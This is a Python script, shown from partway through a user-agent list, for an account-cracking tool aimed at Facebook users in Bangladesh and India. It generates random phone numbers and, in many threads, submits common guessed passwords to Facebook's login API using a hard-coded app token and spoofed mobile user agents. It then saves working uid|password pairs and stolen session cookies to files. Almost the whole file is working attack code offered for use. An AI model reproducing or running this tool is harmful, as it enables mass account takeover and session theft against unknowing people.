(X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60"+"Mozilla/5.0 (X11; CrOS aarch64 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.102 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.936 YaBrowser/23.9.3.936 Yowser/2.5 Safari/537.36"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0"+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.57"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.0 Safari/537.36"+"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 SeaMonkey/2.53.10.2"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0"+"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 GLS/90.10.1589.90"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.933 YaBrowser/23.9.3.933 Yowser/2.5 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",])+END
    return ua
#-----------------------------------------------------#
def SHADHIN001():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	su= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	eb = ";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	ua = su + eb	
	return ua
def SHADHIN002():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	sd= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	el = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	by = "Dalvik/1.6.0 (Linux; U; Android 6.0; 480 Build/854) [FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/314;FBDM/{density=3.0,width=480,height=854};FBLC/it_IT;FBRV/314.1.0.45.119;FBCR/Roshan;FBMF/Infinix_Note_8;FBBD/Infinix_Note_8;FBPN/com.facebook.katana;FBDV/Infinix_Note_8_6_0;FBSV/6.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	ff = "Dalvik/1.6.0 (Linux; U; Android 10.0; 480 Build/854) [FBAN/FB4A;FBAV/107.0.0.0.50;FBBV/107;FBDM/{density=3.0,width=480,height=854};FBLC/it_IT;FBRV/107.0.0.0.50;FBCR/Roshan;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.facebook.katana;FBDV/Huawei_P40_Pro_10_0;FBSV/10.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	gp = "Dalvik/1.6.0 (Linux; U; Android 8.0; 1440 Build/2560) [FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/314;FBDM/{density=3.0,width=1440,height=2560};FBLC/it_IT;FBRV/314.1.0.45.119;FBCR/Etisalat Afghanistan;FBMF/Infinix_Note_8i;FBBD/Infinix_Note_8i;FBPN/com.facebook.katana;FBDV/Infinix_Note_8i_8_0;FBSV/8.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	hc = "Dalvik/1.6.0 (Linux; U; Android 10.0; 1242 Build/2208) [FBAN/FB4A;FBAV/107.0.0.0.50;FBBV/107;FBDM/{density=3.0,width=1242,height=2208};FBLC/it_IT;FBRV/107.0.0.0.50;FBCR/Afghan Wireless;FBMF/Samsung_Galaxy_Note_20_Ultra;FBBD/Samsung_Galaxy_Note_20_Ultra;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_Note_20_Ultra_10_0;FBSV/10.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	kk = "Dalvik/1.6.0 (Linux; U; Android 7.0; 640 Build/1136) [FBAN/FB4A;FBAV/108.0.0.17.68;FBBV/108;FBDM/{density=3.0,width=640,height=1136};FBLC/it_IT;FBRV/108.0.0.17.68;FBCR/Etisalat Afghanistan;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.facebook.katana;FBDV/Huawei_P40_Pro_7_0;FBSV/7.0;FBOP/1;FBCA/x86:armeabi-v7a;]"	
	ua = sd + el + by + ff + gp + hc + kk	
	return ua
#-------------------------------#

logo= (f"""
\x1b[38;5;77m   ╔═══════════════════════════════════════════════════╗
\033[1;36m          _           _______  _______  _______ 
\033[1;36m          | \    /\   (  ___  )(  ____ \(       )
\033[1;36m          |  \  / /   | (   ) || (    \/| () () |
\033[1;32m          |  (_/ /    | |   | || (__    | || || |
\033[1;32m          |   _ (     | |   | ||  __)   | |(_)| |
\033[1;36m          |  ( \ \    | |   | || (      | |   | |
\033[1;36m          |  /  \ \ _ | (___) || )_     | )   ( |
\033[1;36m          |_/    \/(_)(_______)|/(_)    |/     \|

\x1b[38;5;77m   ╚═══════════════════════════════════════════════════╝
\x1b[38;5;77m────────────────────────────────────────────── 
[=] DEVLOPER   ➤ SHADHIN ISLAM
[=] FACEBOOK  ➤ MD SHADHIN ISLAM
[=] TOOL TYPE  ➤RANDOM BD+INDIA
[=] GIT HUB......  ➤ SADHIN-320""")
def linex():
    print(f'\x1b[38;5;77m──────────────────────────────────────────────')
def main():
    os.system('clear');print(logo)
    print(f"{R}[{B}≈{R}] {G}RANDOM CLONING{A} •─➤ {R}({B}A{R})")
    print(f"{R}[{B}≈{R}] {GX}JOIN GROUP{A}  •────➤ {R}({B}B{R})")
    print(f"{R}[{B}≈{R}] {GP}CONTACT ADMIN{A} •──➤ {R}({B}C{R})")
    print(f"{R}[{B}≈{R}] {XXR}EXIT{A}   •─────────➤ {R}({B}X{R})")
    linex()
    t=input(f"{R}[{L}➤➤{R}]\x1b[38;5;48mENTER YOUR CHOICE : ")
    if t in ["1","01","A"]:
        sex()   
    if t in ["2","02","B"]:
        os.system('xdg-open https://facebook.com/groups/822977329469096/')
    if t in ["3","03","C","c"]:
    	os.system('xdg-open https://m.me/IM.YOUR.BROTHER.SHIHAB')
    if t =='X':
        os.system('exit')
    else:
        print(f'{R}[{L}➤➤{R}]PLEASE CHOICE VALID OPTION');time.sleep(2);main()
   
def sex():
    clear()
    print(f"{R}[{B}≈{R}] {G}RANDOM CLONING BD {A}•────➤ {R}({B}A{R})")
    print(f"{R}[{B}≈{R}] {G}RANDOM CLONING INDIA {A}•─➤ {R}({B}B{R})")
    print(f"{R}[{B}≈{R}] {XXR}BACK {R}({B}PRESS INTER{R})");linex()
    tom = input(f"{R}[{L}➤➤{R}]\x1b[38;5;48mENTER YOUR CHOICE : ")
    if tom in ['1','A','S']:
        tom_rndm()
    elif tom in ['2','B','X']:
        tom_ind()
    else:
        back()
        
def tom_rndm():
    clear()
    print(f'{R}[{B}≈{R}] {G}EXAMPLE : {G}017 {X}| {G}019 {X}| {G}016 {X}| {G}018 ');linex()
    code = input(f'{R}[{L}➤➤{R}]\x1b[38;5;46m ENTER SIM CODE : ')
    clear()
    print(f'{R}[{B}≈{R}] {G}EXAMPLE : {G}2000 {X}| {G}5000 {X}| {G}10000{X} | {G}20000');linex()
    limit = int(input(f'{R}[{L}➤➤{R}]\x1b[38;5;46m ENTER LIMIT : '))
    clear()
    print(f'{R}[{B}≈{R}] {G}METHOD A{A} •─➤ {R}({B}1{R}) ')
    print(f'{R}[{B}≈{R}] {G}METHOD B{A} •─➤ {R}({B}2{R}) ');linex()
    mt = input(f"{R}[{L}➤➤{R}]\x1b[38;5;48mENTER YOUR CHOICE : ")
    clear()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        bou.append(nmp)
    with ThreadPoolExecutor(max_workers=30) as Xudi:
        print(f'{R}[{B}≈{R}] {G}SIM CODE  {L}•──➤{G}  {code} ')
        print(f'{R}[{B}≈{R}] {G}TOTAL UID {L}•──➤{G}  {str(len(bou))}')
        print(f'{R}[{B}≈{R}] {G}IF NO RESULT [{W}On/Off{G}] AIRPLANE MODE');linex()
        for love in bou:
            ids = code + love
            psd = [love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'sadiya','yousha','riya123','mafiya','tamanna','roksana','ff lover','jannat','habiba','anzuara','mehedi','i love you','102030','203040','405060','607080','778899','77889900','123456','654321']
            if mt in ['1','A']:
                Xudi.submit(api2,ids,psd)
            elif mt in ['2','B']:
                Xudi.submit(api3,ids,psd)
            else:
                Xudi.submit(api2,ids,psd)
    print('')
    linex()
    print(f'\033[38;5;200m - TOTAL OK ID : {G}{str(len(oks))}')
    linex()
def tom_ind():
    clear()
    print(f'{R}[{B}≈{R}] {G}EXAMPLE : {G}+91967 {X}| {G}+91783 {X}| {G}+91789');linex()
    code = input(f'{R}[{L}➤➤{R}]\x1b[38;5;46m ENTER SIM CODE : ')
    clear()
    print(f'{R}[{B}≈{R}] {G}EXAMPLE : {G}2000 {X}| {G}5000 {X}| {G}10000{X} | {G}20000');linex()
    limit = int(input(f'{R}[{L}➤➤{R}]\x1b[38;5;46m ENTER LIMIT : '))
    clear()
    print(f'{R}[{B}≈{R}] {G}METHOD A{A} •─➤ {R}({B}1{R}) ')
    print(f'{R}[{B}≈{R}] {G}METHOD B{A} •─➤ {R}({B}2{R}) ');linex()
    mt = input(f"{R}[{L}➤➤{R}]\x1b[38;5;48mENTER YOUR CHOICE : ")
    clear()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        bou.append(nmp)
    with ThreadPoolExecutor(max_workers=30) as Xudi:
        print(f'{R}[{B}≈{R}] {G}SIM CODE  {L}•──➤{G}  {code} ')
        print(f'{R}[{B}≈{R}] {G}TOTAL UID {L}•──➤{G}  {str(len(bou))}')
        print(f'{R}[{B}≈{R}] {G}IF NO RESULT [{W}On/Off{G}] AIRPLANE MODE');linex()
        for love in bou:
            ids = code + love
            psd = [love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'57273200','59039200','57575751','123456','7107151']
            if mt in ['1','A']:
                Xudi.submit(api2,ids,psd)
            elif mt in ['2','B']:
                Xudi.submit(api3,ids,psd)
            else:
                Xudi.submit(api2,ids,psd)
    print('')
    linex()
    print(f'{R}[{L}≈{R}]\033[38;5;200m - TOTAL OK ID : {G}{str(len(oks))}')
    linex()

    
def api2(ids,psd):
        global loop
        global oks
        sys.stdout.write(f'\r\r \033[1;37m[{G}SHADHIN-M1\033[38;5;196m\033[1;37m] \033[1;37m[{G}{loop}\033[38;5;196m\033[1;37m] \033[1;37m[{G}OK:-{G}{len(oks)}\033[38;5;196m\033[1;37m]');sys.stdout.flush()
        try:
                for pas in psd:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',                              
                                'error_detail_type':'button_with_disabled',                                
                                'enroll_misauth':'false',                             
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':SHADHIN001(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                xnxx = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);xtx = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                tano = f"sb={xtx};{xnxx}"
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print(f'\r \033[1;37m[\033[38;5;46mKS-😻\033[1;37m] \033[38;5;46m{str(uid)} | {pas}\033[1;37m')
                                        print(f'\r \033[38;5;46m[COOKIE-😜] :{BG} {tano}')
                                        linex()
                                        open('/sdcard/KS-M1-COOKIE.txt', 'a').write(tano+'\n')
                                        open('/sdcard/KS-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print(f'\r\r \033[1;37m[\033[38;5;45mSHADHIN-2F\033[1;37m] \033[38;5;45m{uid} | {pas}\033[1;37m')
                                        open('/sdcard/KS-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid=ids
                                if uid in oks:pass
                                else:
                                        print('\r\r \033[1;37m[\033[38;5;196mSHADHIN-CP\033[1;37m] \033[38;5;196m'+str(uid)+' | '+pas+'\033[1;37m')
                                        open('/sdcard/KS-M1-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
               
def api3(ids,psd):
        global loop
        global oks
        sys.stdout.write(f'\r\r \033[1;37m[{G}SHADHIN-M2\033[38;5;196m\033[1;37m] \033[1;37m[{G}{loop}\033[38;5;196m\033[1;37m] \033[1;37m[{G}OK:-{G}{len(oks)}\033[38;5;196m\033[1;37m]');sys.stdout.flush()
        try:
                for pas in psd:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        SHADHINUAX=random.choice(SHADHIN002())
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',                              
                                'error_detail_type':'button_with_disabled',                                
                                'enroll_misauth':'false',                             
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':SHADHINUAX,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                xnxx = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);xtx = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                tano = f"sb={xtx};{xnxx}"
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print(f'\r \033[1;37m[\033[38;5;46mKS-😻\033[1;37m] \033[38;5;46m{str(uid)} | {pas}\033[1;37m')
                                        print(f'\r \033[38;5;46m[COOKIE-😜] :{BG} {tano}')
                                        linex()
                                        open('/sdcard/KS-M2-COOKIE.txt', 'a').write(tano+'\n')
                                        open('/sdcard/KS-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid=ids
                                if uid in oks:pass
                                else:
                                        ##print(f'\r\r \033[1;37m[\033[38;5;45mSADHIN-2F\033[1;37m] \033[38;5;45m{uid} | {pas}\033[1;37m')
                                        open('/sdcard/KS-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        ####print('\r\r \033[1;37m[\033[38;5;196mSHADHIN-CP-💔\033[1;37m] \033[38;5;196m'+str(uid)+' | '+pas+'\033[1;37m')
                                        open('/sdcard/KS-M2-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                     
if __name__=='__main__':
    main()
